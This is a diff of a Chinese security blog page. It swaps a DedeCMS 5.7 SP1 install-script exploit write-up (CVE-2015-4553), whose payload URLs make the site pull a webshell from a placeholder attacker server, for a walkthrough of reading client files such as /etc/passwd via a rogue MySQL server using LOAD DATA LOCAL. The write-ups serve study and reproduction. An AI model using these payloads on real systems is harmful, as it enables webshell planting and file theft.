@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="dedecms,">
+  <meta name="keywords" content="mysql客户端读取任意文件,">
 
 
 
@@ -79,18 +79,29 @@
 
 
 
-<meta name="description" content="DedeCMS 5.7 SP1 /install/index.php 任意远程文件写入漏洞点： 变量覆盖 1234foreach(Array(&apos;_GET&apos;,&apos;_POST&apos;,&apos;_COOKIE&apos;) as $_request)&amp;#123;    foreach($$_request as $_k =&amp;gt; $_v) $&amp;#123;$_k&amp;#125; = RunMagicQuotes($_v);&amp;#12">
-<meta name="keywords" content="dedecms">
+<meta name="description" content="利用MySQL LOAD DATA读取任意文件load data infilemysql中的load data infile 主要有两种用法。 121. load data infile ‘filename’ into table tablename fields terminated by &apos;分隔符&apos;;2. load data local infile ‘filename’ into table">
+<meta name="keywords" content="mysql客户端读取任意文件">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CVE-2015-4553">
-<meta property="og:url" content="https://TGAOUT.github.io/2019/03/24/CVE-2015-4553/index.html">
+<meta property="og:title" content="&#39;mysql客户端读取任意文件&#39;">
+<meta property="og:url" content="https://TGAOUT.github.io/2019/04/24/mysql客户端读取任意文件/index.html">
 <meta property="og:site_name" content="TGAO&#39;s Blog">
-<meta property="og:description" content="DedeCMS 5.7 SP1 /install/index.php 任意远程文件写入漏洞点： 变量覆盖 1234foreach(Array(&apos;_GET&apos;,&apos;_POST&apos;,&apos;_COOKIE&apos;) as $_request)&amp;#123;    foreach($$_request as $_k =&amp;gt; $_v) $&amp;#123;$_k&amp;#125; = RunMagicQuotes($_v);&amp;#12">
+<meta property="og:description" content="利用MySQL LOAD DATA读取任意文件load data infilemysql中的load data infile 主要有两种用法。 121. load data infile ‘filename’ into table tablename fields terminated by &apos;分隔符&apos;;2. load data local infile ‘filename’ into table">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-03-24T12:19:21.712Z">
+<meta property="og:image" content="https://tgaout.github.io/2019/04/24/mysql客户端读取任意文件/1.png">
+<meta property="og:image" content="https://tgaout.github.io/2019/04/24/mysql客户端读取任意文件/2.png">
+<meta property="og:image" content="https://tgaout.github.io/2019/04/24/mysql客户端读取任意文件/3.png">
+<meta property="og:image" content="https://tgaout.github.io/2019/04/24/mysql客户端读取任意文件/4.png">
+<meta property="og:image" content="https://tgaout.github.io/2019/04/24/mysql客户端读取任意文件/5.png">
+<meta property="og:image" content="https://tgaout.github.io/2019/04/24/mysql客户端读取任意文件/7.png">
+<meta property="og:image" content="https://tgaout.github.io/2019/04/24/mysql客户端读取任意文件/6.png">
+<meta property="og:image" content="https://tgaout.github.io/2019/04/24/mysql客户端读取任意文件/8.png">
+<meta property="og:image" content="https://tgaout.github.io/2019/04/24/mysql客户端读取任意文件/9.png">
+<meta property="og:image" content="https://tgaout.github.io/2019/04/24/mysql客户端读取任意文件/10.png">
+<meta property="og:updated_time" content="2019-04-24T16:47:23.862Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="CVE-2015-4553">
-<meta name="twitter:description" content="DedeCMS 5.7 SP1 /install/index.php 任意远程文件写入漏洞点： 变量覆盖 1234foreach(Array(&apos;_GET&apos;,&apos;_POST&apos;,&apos;_COOKIE&apos;) as $_request)&amp;#123;    foreach($$_request as $_k =&amp;gt; $_v) $&amp;#123;$_k&amp;#125; = RunMagicQuotes($_v);&amp;#12">
+<meta name="twitter:title" content="&#39;mysql客户端读取任意文件&#39;">
+<meta name="twitter:description" content="利用MySQL LOAD DATA读取任意文件load data infilemysql中的load data infile 主要有两种用法。 121. load data infile ‘filename’ into table tablename fields terminated by &apos;分隔符&apos;;2. load data local infile ‘filename’ into table">
+<meta name="twitter:image" content="https://tgaout.github.io/2019/04/24/mysql客户端读取任意文件/1.png">
 
 
 
@@ -120,13 +131,13 @@
 
 
 
-  <link rel="canonical" href="https://TGAOUT.github.io/2019/03/24/CVE-2015-4553/">
+  <link rel="canonical" href="https://TGAOUT.github.io/2019/04/24/mysql客户端读取任意文件/">
 
 
 
 
 
-  <title>CVE-2015-4553 | TGAO's Blog</title>
+  <title>'mysql客户端读取任意文件' | TGAO's Blog</title>
   
 
 
@@ -253,7 +264,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://TGAOUT.github.io/2019/03/24/CVE-2015-4553/">
+    <link itemprop="mainEntityOfPage" href="https://TGAOUT.github.io/2019/04/24/mysql客户端读取任意文件/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="TGAO">
@@ -270,7 +281,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">CVE-2015-4553</h1>
+          <h1 class="post-title" itemprop="name headline">'mysql客户端读取任意文件'</h1>
         
 
         <div class="post-meta">
@@ -282,8 +293,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-24T20:16:57+08:00">
-                2019-03-24
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-24T22:42:24+08:00">
+                2019-04-24
               </time>
             
 
@@ -305,8 +316,8 @@
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
-                    <span itemprop="name">漏洞复现</span>
+                  <a href="/categories/websec/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
                   </a>
                 </span>
 
@@ -342,25 +353,76 @@
       
 
       
-        <h1 id="DedeCMS-5-7-SP1-install-index-php-任意远程文件写入"><a href="#DedeCMS-5-7-SP1-install-index-php-任意远程文件写入" class="headerlink" title="DedeCMS 5.7 SP1 /install/index.php 任意远程文件写入"></a>DedeCMS 5.7 SP1 /install/index.php 任意远程文件写入</h1><p>漏洞点：</p>
-<p>变量覆盖</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">Array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $_request)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_k =&gt; $_v) $&#123;$_k&#125; = RunMagicQuotes($_v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>利用</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(<span class="string">'../data/admin/config_update.php'</span>);</span><br><span class="line">	$rmurl = $UPDATEHOST.<span class="string">"dedecms/demodata.&#123;$s_lang&#125;.txt"</span>;</span><br><span class="line">	<span class="keyword">echo</span> $UPDATEHOST;</span><br><span class="line">	$sql_content = file_get_contents($rmurl);</span><br><span class="line">	<span class="comment">//var_dump($rmurl);</span></span><br><span class="line">	$fp = fopen($INSTALL_DEMO_NAME,<span class="string">'w'</span>);</span><br><span class="line">	<span class="keyword">if</span>(fwrite($fp,$sql_content))</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&amp;nbsp; &lt;font color="green"&gt;[√]&lt;/font&gt; 存在(您可以选择安装进行体验)'</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&amp;nbsp; &lt;font color="red"&gt;[×]&lt;/font&gt; 远程获取失败'</span>;</span><br></pre></td></tr></table></figure>
-<ol>
-<li><p>通过传参覆盖<code>$s_lang</code>变量和<code>$INSTALL_DEMO_NAME</code>变量</p>
-<p>payload1：<a href="http://127.0.0.1:99/install/index.php?s_lang=a&amp;INSLOCKFILE=a&amp;step=11&amp;INSTALL_DEMO_NAME=../data/admin/config_update.php" target="_blank" rel="noopener">http://127.0.0.1:99/install/index.php?s_lang=a&amp;INSLOCKFILE=a&amp;step=11&amp;INSTALL_DEMO_NAME=../data/admin/config_update.php</a></p>
-<p>导致<code>$rmurl</code>变量覆盖为<code>file_get_contents函数获取不到的资源</code></p>
-<p><code>$INSTALL_DEMO_NAME</code>变量覆盖为<code>../data/admin/config_update.php</code></p>
-<p>从而导致<code>../data/admin/config_update.php</code>文件为空文件，也就是删去了文件中的<code>$UPDATEHOST</code>变量，导致可以通过变量覆盖漏洞重写<code>$UPDATEHOST</code>为自己的vps服务器</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$content=file_get_contents(<span class="string">"http://xxx.xxx.xxx.xxx/l.txt"</span>);</span><br><span class="line">var_dump($content);<span class="comment">//The function returns the read data 或者在失败时返回 FALSE.这里构造一个不存在的资源，所以返回false</span></span><br><span class="line">$fp=fopen(<span class="string">"qqq.php"</span>,<span class="string">"w"</span>);</span><br><span class="line">var_dump(fwrite($fp,$content));<span class="comment">//fwrite返回写入的字符数，出错时返回flase，这里返回int 0</span></span><br><span class="line"><span class="keyword">if</span>(fwrite($fp,$content))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"fuck"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+        <h1 id="利用MySQL-LOAD-DATA读取任意文件"><a href="#利用MySQL-LOAD-DATA读取任意文件" class="headerlink" title="利用MySQL LOAD DATA读取任意文件"></a>利用MySQL LOAD DATA读取任意文件</h1><h2 id="load-data-infile"><a href="#load-data-infile" class="headerlink" title="load data infile"></a>load data infile</h2><p>mysql中的load data infile 主要有两种用法。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> load data infile ‘filename’ into table tablename fields terminated by <span class="string">'分隔符'</span>;</span><br><span class="line"><span class="number">2.</span> load data local infile ‘filename’ into table tablename fields terminated by <span class="string">'分隔符'</span>;</span><br></pre></td></tr></table></figure>
+<p><strong>它们的区别在于</strong></p>
+<p>load data infile 读取服务端的文件 （被动连接数据库的一端为服务端）并存入指定表中。</p>
+<p>load data local infile 读取客户端的文件 （主动连接数据库的一端为客户端）并存入指定表中。</p>
+<p>官方手册上已经给出了关于load data local安全的详细说明</p>
+<p><img src="/2019/04/24/mysql客户端读取任意文件/1.png" alt="img"></p>
+<h2 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h2><h3 id="前奏"><a href="#前奏" class="headerlink" title="前奏"></a>前奏</h3><ol>
+<li><p>tcpdump 抓包</p>
+<p><code>tcpdump -i lo port 3306 -w test.cap</code></p>
 </li>
-<li><p>覆盖<code>$UPDATEHOST</code>为自己的vps，在vps上放上shell文件<code>dedecms/demodata.a.txt</code>，覆盖<code>$INSTALL_DEMO_NAME</code>为要写入的文件名</p>
-<p>因为<code>fopen</code>函数遇到不存在的函数名，会自动创建文件名。</p>
-<p>payload2：<a href="http://127.0.0.1:99/install/index.php?step=11&amp;UPDATEHOST=http://xxx.xxx.xxx.xxx/&amp;INSTALL_DEMO_NAME=webshell.php&amp;s_lang=a&amp;INSLOCKFILE=a" target="_blank" rel="noopener">http://127.0.0.1:99/install/index.php?step=11&amp;UPDATEHOST=http://xxx.xxx.xxx.xxx/&amp;INSTALL_DEMO_NAME=webshell.php&amp;s_lang=a&amp;INSLOCKFILE=a</a></p>
+<li><p>登录mysql 执行load data local infile ‘filename’ into table tablename</p>
 </li>
 </ol>
-<p>修复方案：将变量覆盖的代码移至文件最前面；或者通过define定义常量，是关键点无法被覆盖。</p>
+<p>将数据包test.cap拖到本地。利用wireshark进行分析。</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ol>
+<li><p>服务端向客户端发送greeting问候数据包，包含banner信息。</p>
+<p><img src="/2019/04/24/mysql客户端读取任意文件/2.png" alt="img"></p>
+</li>
+<li><p>客户端向服务端发送登录请求包，包含用户名和密码，以及和关于load data local 客户端的banner信息。</p>
+<p><img src="/2019/04/24/mysql客户端读取任意文件/3.png" alt="img"></p>
+</li>
+<li><p>然后是客户端初始化的一些查询，比如<code>select database();</code> <code>select @@version_comment;</code> </p>
+<p><img src="/2019/04/24/mysql客户端读取任意文件/4.png" alt="img"></p>
+</li>
+<li><p>找到我们执行的<code>LOAD DATA INFILE</code>数据包，是客户端发起的<code>Request Query</code>。 </p>
+<p><img src="/2019/04/24/mysql客户端读取任意文件/5.png" alt="img"></p>
+</li>
+<li><p>紧接着服务器返回了一个包含刚才所要<code>LOAD DATA INFILE</code>的文件名<code>/etc/passwd</code>的数据包 。</p>
+<p><img src="/2019/04/24/mysql客户端读取任意文件/7.png" alt="img"></p>
+</li>
+<li><p>然后客户端向服务端发送了<code>/etc/passwd</code>文件的内容 <img src="/2019/04/24/mysql客户端读取任意文件/6.png" alt="img"></p>
+</li>
+</ol>
+<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>如果我们在客户端发送查询之后，返回一个<code>Response TABULAR</code>数据包，即服务端向客户端发送了文件名的数据包，如果我们把这个文件名设置成我们想要读取的文件，那么我们就可以读取客户端的任意文件了。正如官方文档所写的<code>In theory, a patched server could be built that would tell the client  program to transfer a file of the server&#39;s choosing rather than the file named by the client in the [LOAD  DATA](https://dev.mysql.com/doc/refman/8.0/en/load-data.html  &quot;13.2.7 LOAD DATA Syntax&quot;) statement.</code> </p>
+<p>也就是说想要读取哪个文件是服务端说了算，跟客户端所request的文件名没有关系。 </p>
+<p>最重要的是伪造的服务端可以在任何时候回复一个<code>file-transfer</code> 请求，在官方文档上，会发现有这么一句：”A patched server could in fact reply with a  file-transfer request to any statement, not just LOAD DATA LOCAL”</p>
+<p>伪造的服务端可以在任何时候回复一个 file-transfer 请求，不一定非要是在<code>LOAD DATA LOCAL</code>的时候。这里有一点要说明的是，如果想要利用此特性，客户端必须具有 CLIENT_LOCAL_FILES 属性，这一点也会在下文提到的官方数据包格式文档中有所说明，这也是为什么在前面测试的时候需要添加<code>--enable-local-infile</code>的原因。 </p>
+<h2 id="搭建服务端"><a href="#搭建服务端" class="headerlink" title="搭建服务端"></a>搭建服务端</h2><p>主要分为 </p>
+<ul>
+<li>向 MySQL Client 发送Server Greeting </li>
+<li>等待 Client 端发送一个Query Package  </li>
+<li>回复一个file transfer请求 </li>
+</ul>
+<p>我们需要知道如何构造<code>File Transfer</code>和<code>Server Greeting</code>数据包，这些包的格式都可以在 MySQL 的官方文档上找到。 </p>
+<p>具体可以看本文下方的链接。</p>
+<p>这里直接贴出github上的一个项目：<a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server</a></p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>测试环境：</p>
+<ol>
+<li>客户端：win10</li>
+<li>服务端：centos</li>
+</ol>
+<p>具体步骤：</p>
+<ol>
+<li><p>关闭centos上的mysql服务，注意3306端口占用问题。利用lsof -i:3306查看进程，kill pid杀掉此进程。</p>
+</li>
+<li><p>在centos运行github上的脚本</p>
+<p><img src="/2019/04/24/mysql客户端读取任意文件/8.png" alt="img"></p>
+</li>
+<li><p>在win上连接centos主机数据库</p>
+<p><img src="/2019/04/24/mysql客户端读取任意文件/9.png" alt="img"></p>
+</li>
+<li><p>查看mysql.log文件</p>
+<p><img src="/2019/04/24/mysql客户端读取任意文件/10.png" alt="img"></p>
+</li>
+</ol>
+<p>##Referer   </p>
+<p><a href="https://lightless.me/archives/read-mysql-client-file.html" target="_blank" rel="noopener">Read MySQL Client’s File</a> </p>
+<p><a href="https://xz.aliyun.com/t/3973" target="_blank" rel="noopener">利用MySQL LOAD DATA特性达到任意文件读取</a> </p>
+<p><a href="https://www.smi1e.top/mysql-load-data-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/" target="_blank" rel="noopener">MySQL LOAD DATA 读取客户端任意文件</a></p>
 
       
     </div>
@@ -378,7 +440,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/dedecms/" rel="tag"># dedecms</a>
+            <a href="/tags/mysql客户端读取任意文件/" rel="tag"># mysql客户端读取任意文件</a>
           
         </div>
       
@@ -391,8 +453,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/12/29/CTF_WP/" rel="next" title="SEVERAL_CTF_WP">
-                <i class="fa fa-chevron-left"></i> SEVERAL_CTF_WP
+              <a href="/2019/04/22/反序列化bypass_wakeup方法/" rel="next" title="'反序列化bypass__wakeup方法'">
+                <i class="fa fa-chevron-left"></i> '反序列化bypass__wakeup方法'
               </a>
             
           </div>
@@ -400,10 +462,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/03/31/嘉韦思杯wp/" rel="prev" title="嘉韦思杯wp">
-                嘉韦思杯wp <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -571,7 +629,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DedeCMS-5-7-SP1-install-index-php-任意远程文件写入"><span class="nav-text">DedeCMS 5.7 SP1 /install/index.php 任意远程文件写入</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#利用MySQL-LOAD-DATA读取任意文件"><span class="nav-text">利用MySQL LOAD DATA读取任意文件</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#load-data-infile"><span class="nav-text">load data infile</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#数据包分析"><span class="nav-text">数据包分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#前奏"><span class="nav-text">前奏</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分析"><span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#结论"><span class="nav-text">结论</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#搭建服务端"><span class="nav-text">搭建服务端</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#测试"><span class="nav-text">测试</span></a></li></ol></li></ol></div>
             
 
           </div>
